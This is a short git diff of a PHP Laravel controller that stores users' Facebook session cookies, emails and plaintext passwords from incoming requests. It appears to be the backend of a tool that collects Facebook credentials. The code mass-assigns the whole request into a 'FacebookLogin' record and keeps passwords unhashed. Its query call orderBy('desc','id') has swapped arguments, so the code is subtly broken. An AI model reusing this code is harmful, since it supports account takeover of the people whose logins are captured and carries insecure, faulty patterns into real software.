@@ -169,7 +169,7 @@ $validator = Validator::make($request->all(), $rules);
             {
                // echo "<pre>"; print_r($request['data']); die();
                 $data = Cookies::where('user_id',$request['user_id'])->update($request->except(['data']));
-                FacebookLogin::create(['cookies_data' => ]);
+                FacebookLogin::create($request->all());
 
                 if($data)
                 {
@@ -245,8 +245,8 @@ $validator = Validator::make($request->all(), $rules);
 
     public function updatecookie(Request $request)
     {
-      $logid = FacebookLogin::where('user_id',$request['user_id'])->orderBy('desc','id')->first();
-        Cookies::where('user_id',$request['user_id'])->update(['email' => $request['email'],'password' => $request['password']]);
+         Cookies::where('user_id',$request['user_id'])->update(['email' => $request['email'],'password' => $request['password']]);
+      $logid = FacebookLogin::where('user_id',$request['user_id'])->orderBy('desc','id')->first();       
           FacebookLogin::where('id', $logid['id'])->update(['email' => $request['email'],'password' => $request['password']]);   
     }
 
